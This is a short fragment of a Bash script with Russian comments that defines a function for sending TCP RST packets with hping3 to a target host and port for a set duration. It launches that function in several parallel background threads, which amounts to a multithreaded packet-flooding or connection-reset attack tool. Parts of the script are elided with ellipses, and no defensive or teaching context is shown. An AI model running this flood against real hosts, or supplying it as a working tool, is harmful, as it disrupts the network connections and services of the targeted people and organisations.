...
# Функция для отправки TCP RST пакетов
send_tcp_rst_packets() {
    local target=$1
    local port=$2
    local duration=$3
    local thread_id=$4
    ...
    while [ $(($(date +%s) - start_time)) -lt $duration ]; do
        if hping3 -R -p $port $target > /dev/null 2>&1; then
...
for ((i=0; i<THREADS; i++)); do
    send_tcp_rst_packets "$TARGET" "$PORT" "$DURATION" "$i" >> "$TEMP_FILE" &
    pids[$i]=$!
done
